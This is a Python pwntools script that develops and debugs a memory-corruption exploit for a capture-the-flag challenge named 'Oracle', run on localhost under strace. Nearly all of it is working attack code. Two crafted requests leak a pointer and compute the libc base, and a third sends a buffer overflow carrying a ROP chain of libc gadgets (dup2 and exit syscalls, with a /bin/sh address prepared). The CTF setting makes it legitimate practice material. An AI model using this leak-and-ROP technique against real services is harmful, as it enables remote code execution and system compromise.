#!/usr/bin/env python3
"""Self-contained strace debugging script."""
import subprocess, time, os, signal

BASE = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Oracle/pwn_oracle/challenge'
BIN = f'{BASE}/oracle'
LD = f'{BASE}/glibc/ld-linux-x86-64.so.2'
LIBCDIR = f'{BASE}/glibc'
STRACE_LOG = '/tmp/oracle_strace3.log'

# Start oracle under strace
cmd = ['strace', '-f', '-e', 'trace=dup2,read,write,execve', '-o', STRACE_LOG,
       LD, '--library-path', LIBCDIR, BIN]
proc = subprocess.Popen(cmd, cwd=BASE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(2)
print(f'Oracle PID: {proc.pid}')

from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

# Ph1
r = remote('127.0.0.1', 1337, timeout=10)
r.send(b'PLAGUE bbb HTTP/1.0\r\nContent-Length: 2048\r\nPlague-Target: dummy\r\n\r\n' + b'A' * 16)
r.recvall(timeout=3); r.close()
print('Ph1 done')

# Ph2
r = remote('127.0.0.1', 1337, timeout=10)
r.send(b'PLAGUE ccc HTTP/1.0\r\nContent-Length: 2048\r\n\r\n' + b'X')
data = r.recvall(timeout=5); r.close()
print('Ph2 done')

bk = u64(data[data.find(b'Attempted plague: ') + len(b'Attempted plague: '):][8:16])
libc_base = bk - 0x60 - 0x1d2c60
print(f'libc_base = {hex(libc_base)}')

# Gadgets
pop_rdi  = libc_base + 0x1cf297
pop_rsi  = libc_base + 0x1cf0c4
pop_rdx  = libc_base + 0x4cae
pop_rax  = libc_base + 0xd6a27
syscall_g = libc_base + 0x95086
exit_fn  = libc_base + 0x411c0
binsh    = libc_base + 0x1b4a9a

# Test: dup2(6,0) via syscall + exit(42)  
gadgets = [pop_rdi, 6, pop_rsi, 0, pop_rax, 33, syscall_g, pop_rdi, 42, pop_rax, 60, syscall_g]

payload = b'Content-Length: 100\r\n\x00'
payload += b'B' * (1064 - 22)  
payload += b'\x37'
for g in gadgets:
    payload += p64(g)
payload += b'\r\n\r\n'

print(f'Payload length: {len(payload)}')
print(f'Gadgets count: {len(gadgets)}')

# Check for bad bytes
bad_bytes = [(i, b) for i, g in enumerate(gadgets) for b in [p64(g)] if any(x in (0x0a, 0x0d) for x in b)]
print(f'Bad bytes: {len(bad_bytes)}')

r = remote('127.0.0.1', 1337, timeout=10)
r.send(b'PLAGUE ddd HTTP/1.0\r\n' + payload)
time.sleep(2)

try:
    resp = r.recv(timeout=2)
    print(f'RX: {repr(resp[:100])}')
except EOFError:
    print('EOF')
except Exception as e:
    print(f'Error: {e}')

r.close()
time.sleep(0.5)

# Check process
alive = proc.poll() is None
print(f'Oracle alive: {alive}')
if not alive:
    print(f'Exit code: {proc.returncode}')

# Read strace log
try:
    with open(STRACE_LOG) as f:
        lines = f.readlines()
    print(f'\n=== STRACE (last 30 lines, dup2/execve/write/read/signal) ===')
    for line in lines[-60:]:
        if any(x in line for x in ['dup2', 'execve', 'SIG', 'write(']):
            print(line.rstrip())
except:
    print('Could not read strace log')

os.kill(proc.pid, signal.SIGKILL)
proc.wait()
